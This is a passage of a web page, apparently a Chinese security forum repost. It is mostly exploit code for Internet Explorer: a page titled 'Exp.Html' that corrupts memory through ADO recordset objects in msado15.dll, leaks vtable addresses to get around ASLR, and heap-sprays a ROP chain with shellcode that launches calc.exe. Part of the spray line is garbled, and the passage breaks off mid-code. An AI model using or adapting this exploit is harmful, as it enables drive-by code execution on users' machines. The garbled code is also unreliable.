+<P>&lt;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; value2&nbsp; </P>
+<P>&lt;/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC&gt;&nbsp; </P>
+<P>&lt;/data&gt;&nbsp; </P>
+<P>&lt;/root&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; &lt;/body&gt;&nbsp; </P>
+<P>&lt;/html&gt; </P></TD></TR></TBODY></TABLE></P>
+<P align=center>----------------------------------------------------------------------------------------------</P>
+<P align=center><STRONG>一共2个文件：一个HTML，一个JS。</STRONG></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Exp.Html：</FONT></P>
+<P>&lt;html xmlns:t = "urn:schemas-microsoft-com:time"&gt; <br />
+&nbsp; &lt;head&gt; <br />
+&nbsp; &lt;meta name="License" content="Q Public License;[url]http://en.wikipedia.org/wiki/Q_Public_License[/url]"&gt; <br />
+&nbsp;&nbsp;&nbsp; &lt;style&gt; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .body { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #test { <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; &lt;/style&gt; <br />
+&nbsp;&nbsp;&nbsp; &lt;script src="heapLib.js"&gt;&lt;/script&gt; <br />
+&nbsp;&nbsp;&nbsp; &lt;script&gt; <br />
+&nbsp;&nbsp;&nbsp; // This code has been released under the Q Public License by Trolltech <br />
+&nbsp;&nbsp;&nbsp; // [url]http://en.wikipedia.org/wiki/Q_Public_License[/url]</P>
+<P>var StartTime = new Date();&nbsp;&nbsp;&nbsp;  <br />
+var FinalHeapSpraySize = 900; <br />
+//var SmallHoleSize = 0x1F0; <br />
+var SmallHoleSize = 0x240; <br />
+var GlobalRowCounter = 0; <br />
+&nbsp;  <br />
+var localxmlid1; <br />
+var localxmlid2;&nbsp;&nbsp;&nbsp;  <br />
+var localxmlid3;&nbsp;&nbsp;&nbsp;  <br />
+var localxmlid5;&nbsp;  <br />
+var adobase = 0; <br />
+var finalspray = ''; <br />
+var heap = null; <br />
+var ExpoitTime = 10; <br />
+var CurrentHeapSpraySize = 0;</P>
+<P> <br />
+function Start() { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FaseOne(); <br />
+}</P>
+<P>&nbsp;</P>
+<P>function FaseOne() {</P>
+<P>&nbsp; localxmlid1 = document.getElementById('xmlid1').recordset;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; localxmlid2 = document.getElementById('xmlid2').recordset;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; localxmlid3 = document.getElementById('xmlid3').recordset;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; localxmlid5 = document.getElementById('xmlid5').recordset;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;  <br />
+&nbsp; localxmlid2.CacheSize = 0x40000358; <br />
+&nbsp;  <br />
+&nbsp; localxmlid1.CacheSize = SmallHoleSize;;&nbsp;&nbsp; //small hole? <br />
+&nbsp; localxmlid1.AddNew(["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"], ["c"]);  <br />
+&nbsp; localxmlid5.AddNew(["BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"], ["c"]);  <br />
+&nbsp;  <br />
+&nbsp;  <br />
+&nbsp; var my1field = localxmlid5.Fields.Item(0); <br />
+&nbsp; localxmlid1.MoveFirst(); <br />
+&nbsp;  <br />
+&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);&nbsp;  <br />
+&nbsp;  <br />
+&nbsp; localxmlid1.Close(); <br />
+&nbsp; CollectGarbage(); <br />
+&nbsp;  <br />
+&nbsp; localxmlid3.MoveFirst(); <br />
+&nbsp;  <br />
+&nbsp; void(Math.atan2(0xbabe, ('###################### 2 Move First').toString())); <br />
+&nbsp; localxmlid2.MoveFirst();</P>
+<P>&nbsp; void(Math.atan2(0xbabe, ('###################### 5 Move First').toString())); <br />
+&nbsp; localxmlid5.CacheSize = 0x40000008; <br />
+&nbsp; localxmlid5.MoveFirst(); <br />
+&nbsp; localxmlid3.AddNew(["MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong"], ["cccccuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuFINDMEccccc"]); </P>
+<P>&nbsp; var localxmlid4 = document.getElementById('xmlid4').recordset;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid4.AddNew(["bb"], ["c"]); </P>
+<P>&nbsp; localxmlid4.MoveNext();&nbsp;  <br />
+&nbsp;  <br />
+&nbsp;  <br />
+&nbsp; var localxmlid6 = document.getElementById('xmlid6').recordset;  <br />
+&nbsp; localxmlid6.AddNew(["CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"], ["c"]);&nbsp;  <br />
+&nbsp;  <br />
+&nbsp; localxmlid2.MoveFirst(); <br />
+&nbsp;  <br />
+&nbsp; Math.tan(1); <br />
+&nbsp;  <br />
+&nbsp; document.getElementById('textfaseone').innerText = 'Setting up data for ASLR evasion:'; <br />
+&nbsp; if(GlobalRowCounter &lt; 0x10120) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(IncreaseRowCounter, 100); <br />
+&nbsp; } <br />
+}</P>
+<P> <br />
+function IncreaseRowCounter() { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //alert('IncreaseRowCounter: ' + GlobalRowCounter) <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(GlobalRowCounter &lt; 0x10120) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0x300; i++) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GlobalRowCounter++; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.Delete(); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; var percentcomplete = Math.round(GlobalRowCounter /0x10120 * 100); <br />
+&nbsp;&nbsp;&nbsp; document.getElementById('progressfaseone').innerText = percentcomplete + "%"; <br />
+&nbsp;&nbsp;&nbsp; window.setTimeout(IncreaseRowCounter, 100); <br />
+&nbsp; } <br />
+&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfaseonedone').innerText = 'Now searching memory for suitable vtable. Please wait...'; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(FindADOBase, 100); <br />
+&nbsp; } <br />
+}</P>
+<P>function FindADOBase() { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //alert('FindADOBase'); <br />
+&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; var myfield = localxmlid3.Fields.Item(1);</P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0xDF6; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.MoveFirst(); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(myfield.Name != "MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong") { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; //alert('done first');</P>
+<P>&nbsp; void(Math.atan2(0xbabe, ('###################### Add untill vftable 2').toString())); <br />
+&nbsp;  <br />
+&nbsp; var vftable1 = null; <br />
+&nbsp; var vftable2 = null; <br />
+&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0xAE0; i++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void(Math.atan2(0xbabe, ('add row: ' + i).toString())); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.MoveFirst(); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if(i &gt; 10) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp; document.forms[0].myresult.value += i.toString(16) + " : " + escape(myfield.name.substr((2 * i) + 4, 8)) + " : "&nbsp; + myfield.name.length + "\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //} <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uAD68/)) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vftable1 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uD738/)) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vftable2 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(vftable1&nbsp; &amp;&amp; vftable2) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp; //document.forms[0].myresult.value += "\n\nVFTABLES: " + vftable1 + " : " + vftable2 + "\n\n\n"; <br />
+&nbsp;&nbsp; //alert(vftable1); <br />
+&nbsp;&nbsp; if((parseInt(vftable1,16) - 0x1AD68) == (parseInt(vftable2,16) - 0xD738)) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adobase = parseInt(vftable1,16) - 0x1AD68; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfoundaddress').innerText = 'Found base address of &lt;censored&gt;.dll: 0x&lt;censored&gt;';// + adobase.toString(16); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FaseTwo(); <br />
+&nbsp;&nbsp; } <br />
+&nbsp;&nbsp; else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp; alert('sadly we failed to read the base address of msado15.dll :( ');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;  <br />
+}&nbsp;&nbsp;&nbsp; </P>
+<P>function FaseTwo() {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfasetwo').innerText = 'Setting up heap for DEP evasion:'; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('progressfasetwo').innerText = '0%'; <br />
+&nbsp; heap = new heapLib.ie(0x20000);</P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; var heapspray = unescape("%u2020%u1604%u0102, %u0103%u0104%u0105" + MakeAddre, , , ssString(adobase + 0x117C3) + MakeAddressString(adobase + 0x, 1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123" + MakeAddressString(adobase)&nbsp; + "%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)&nbsp; + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + "%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F" +  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "%u9090%u9090%u868B%u1108%u0000%u5056%u056A%uA068%u0421%u0516%u185E%u0008%uD0FF%u5058%u0590%u0BBB%u0000%uD0FF%uF88B%u0558%u3B47%u0000%u006A%uFF57%uCCD0" + "%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF" +&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "%u6163%u636C%u652E%u6578%u0000%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578%u0000%u0000" + "%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF"); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //"%u6163%u636C%u652D%u6578%u0000 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%u3A63%u775C%u6E69%u6F64%u7377%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //c:\windows\system32\calc.exe <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%63%61%6C%63%2E%65%78%65 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%63%3A%5C%77%69%6E%64%6F%77%73%5C%73%79%73%74%65%6D%33%32%5C%63%61%6C%63%2E%65%78%65&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br />
+&nbsp; //var heapspray = unescape("%u2020%u1604%u0102%u0103%u0104%u0105" + MakeAddressString(adobase + 0x117C3) + MakeAddressString(adobase + 0x1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123%u0124%u0125%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)&nbsp; + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + 